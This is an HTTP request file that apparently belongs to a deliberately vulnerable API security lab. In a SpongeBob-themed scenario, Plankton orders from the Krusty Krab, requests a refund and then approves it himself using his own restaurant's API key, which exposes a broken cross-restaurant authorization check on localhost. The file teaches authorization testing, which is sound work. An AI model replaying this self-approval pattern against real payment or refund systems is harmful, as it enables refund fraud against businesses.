@base = http://localhost:8000/api/v302

# Plankton now has Chum Bucket Restaurant API key
@chum_bucket_api_key = key-plankton-a1b2c3d4-e5f6-4a5b-8c9d-0e1f2a3b4c5d
@krusty_krab_api_key = key-mrkrabs-1bd647c2-dc5b-4c2b-a316-5ff83786c219

### He also keeps using his customer credentials to order from Krusty Krab
POST {{base}}/auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

### Plankton creates a cart in Krusty Krab and adds a krabby patty to it
# NOTE: New argument, restaurant_id is **required**!
# @name cart
POST {{base}}/cart?restaurant_id=1

###
POST {{base}}/cart/{{cart.response.body.cart_id}}/items
Content-Type: application/json

{
  "item_id": "4"
}

### Plankton checks out the cart and creates an order (so far so good)
# @name order
POST {{base}}/cart/{{cart.response.body.cart_id}}/checkout
Content-Type: application/x-www-form-urlencoded

tip=1&delivery_address=Chum Backet Restaurant

### Plankton's balance is now $73.50 (remember this amount)
GET {{base}}/account/info

### Plankton requests a refund as soon as it's delivered
POST {{base}}/orders/{{order.response.body.order_id}}/refund
Content-Type: application/x-www-form-urlencoded

amount=26.50

### Refund is pending and will likely be rejected by Mr. Krabs
GET {{base}}/orders/{{order.response.body.order_id}}/refund/status

### Plankton tries to approve his own refund request, but this fails because he's not a Krusty Krab manager
PATCH {{base}}/orders/{{order.response.body.order_id}}/refund/status
Content-Type: application/x-www-form-urlencoded

status=approved

### Vulnerable Example: Plankton can use the Chum Bucket Restaurant API key to approve his own refund request
# Note: it happens because 1) Mr. Krabs hasn't changed the refund status yet and 2) Plankton is a manager of Chum Bucket Restaurant
PATCH {{base}}/orders/{{order.response.body.order_id}}/refund/status
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=approved

### Refund is now approved
GET {{base}}/orders/{{order.response.body.order_id}}/refund/status

### Plankton's balance is back to $100
GET {{base}}/account/info
